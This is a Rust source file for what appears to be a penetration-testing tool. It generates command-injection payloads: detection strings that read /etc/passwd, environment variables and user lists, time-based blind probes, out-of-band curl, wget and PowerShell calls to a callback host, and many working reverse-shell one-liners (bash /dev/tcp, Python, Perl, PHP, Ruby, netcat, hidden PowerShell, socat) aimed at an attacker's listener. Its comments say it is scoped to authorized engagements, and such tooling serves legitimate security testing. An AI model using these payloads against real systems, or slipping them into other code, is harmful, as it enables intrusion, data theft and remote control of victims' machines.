/// Command injection payload library.
///
/// Callback/listener addresses are **never** hardcoded — callers must supply
/// their own listener IP and port so payloads are always scoped to the
/// authorized engagement infrastructure.
pub struct CommandInjection;

impl CommandInjection {
    // ── Detection payloads ────────────────────────────────────────────────────

    /// Basic output-based detection payloads (Unix).
    pub fn get_basic_payloads() -> Vec<String> {
        vec![
            "; id".to_string(),
            "| id".to_string(),
            "` id`".to_string(),
            "$(id)".to_string(),
            "&& id".to_string(),
            "|| id".to_string(),
            "; whoami".to_string(),
            "; uname -a".to_string(),
            "; cat /etc/passwd".to_string(),
            "; ls -la /".to_string(),
            "; pwd".to_string(),
            "; env".to_string(),
            "; ps aux".to_string(),
            "; hostname".to_string(),
            "; ip addr show".to_string(),
        ]
    }

    /// Windows-specific detection payloads.
    pub fn get_windows_payloads() -> Vec<String> {
        vec![
            "& dir".to_string(),
            "| dir".to_string(),
            "; dir".to_string(),
            "& whoami".to_string(),
            "& net user".to_string(),
            "& ipconfig /all".to_string(),
            "& systeminfo".to_string(),
            "& type C:\\windows\\win.ini".to_string(),
            "& echo %USERNAME%".to_string(),
            "& echo %COMPUTERNAME%".to_string(),
            "& tasklist".to_string(),
            "& wmic os get Caption".to_string(),
        ]
    }

    /// Time-based blind detection payloads (no output required).
    pub fn get_time_based_payloads() -> Vec<String> {
        vec![
            "; sleep 5".to_string(),
            "| sleep 5".to_string(),
            "&& sleep 5".to_string(),
            "`sleep 5`".to_string(),
            "$(sleep 5)".to_string(),
            "; ping -c 5 127.0.0.1".to_string(),
            "| ping -c 5 127.0.0.1".to_string(),
            // Windows
            "& timeout /t 5 /nobreak".to_string(),
            "& ping -n 5 127.0.0.1".to_string(),
        ]
    }

    // ── OOB / blind payloads (require caller-supplied callback host) ──────────

    /// Out-of-band DNS/HTTP payloads for blind command injection.
    /// `callback_host` should be your Burp Collaborator / interactsh instance.
    pub fn get_oob_payloads(callback_host: &str) -> Vec<String> {
        vec![
            format!("; nslookup {}", callback_host),
            format!("| nslookup {}", callback_host),
            format!("; curl http://{}/ci", callback_host),
            format!("| curl http://{}/ci", callback_host),
            format!("; wget -q http://{}/ci -O /dev/null", callback_host),
            format!("; ping -c 1 {}", callback_host),
            // Windows
            format!("& nslookup {}", callback_host),
            format!("& curl http://{}/ci", callback_host),
            format!("& powershell -c \"Invoke-WebRequest http://{}/ci\"", callback_host),
        ]
    }

    // ── Post-exploitation / reverse shells (require caller-supplied listener) ─

    /// Reverse shell one-liners.
    /// `listener_ip` and `listener_port` must be the attacker-controlled listener
    /// on the authorized engagement network.
    pub fn get_reverse_shell_payloads(listener_ip: &str, listener_port: u16) -> Vec<String> {
        vec![
            // Bash TCP
            format!("bash -i >& /dev/tcp/{}/{} 0>&1", listener_ip, listener_port),
            format!("/bin/bash -i >& /dev/tcp/{}/{} 0>&1", listener_ip, listener_port),
            // Bash UDP
            format!("bash -i >& /dev/udp/{}/{} 0>&1", listener_ip, listener_port),
            // Python 3
            format!(
                "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{}\",{}));\
                [os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'",
                listener_ip, listener_port
            ),
            // Python 2
            format!(
                "python -c 'import socket,os,pty;s=socket.socket();s.connect((\"{}\",{}));\
                [os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'",
                listener_ip, listener_port
            ),
            // Perl
            format!(
                "perl -e 'use Socket;$i=\"{}\";$p={};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));\
                if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");\
                open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
                listener_ip, listener_port
            ),
            // PHP
            format!(
                "php -r '$sock=fsockopen(\"{}\",{});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
                listener_ip, listener_port
            ),
            // Ruby
            format!(
                "ruby -rsocket -e'f=TCPSocket.open(\"{}\",{}).to_i;\
                exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
                listener_ip, listener_port
            ),
            // Netcat with -e
            format!("nc -e /bin/sh {} {}", listener_ip, listener_port),
            format!("nc -e /bin/bash {} {}", listener_ip, listener_port),
            // Netcat without -e (mkfifo)
            format!(
                "rm -f /tmp/.ox;mkfifo /tmp/.ox;cat /tmp/.ox|/bin/sh -i 2>&1|nc {} {} >/tmp/.ox",
                listener_ip, listener_port
            ),
            // PowerShell
            format!(
                "powershell -nop -w hidden -c \"$c=New-Object Net.Sockets.TCPClient('{}',{});\
                $s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};\
                while(($i=$s.Read($b,0,$b.Length)) -ne 0){{\
                $d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);\
                $r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';\
                $x=([text.encoding]::ASCII).GetBytes($r2);$s.Write($x,0,$x.Length);$s.Flush()}}\"",
                listener_ip, listener_port
            ),
            // Socat
            format!(
                "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{}:{}",
                listener_ip, listener_port
            ),
        ]
    }

}
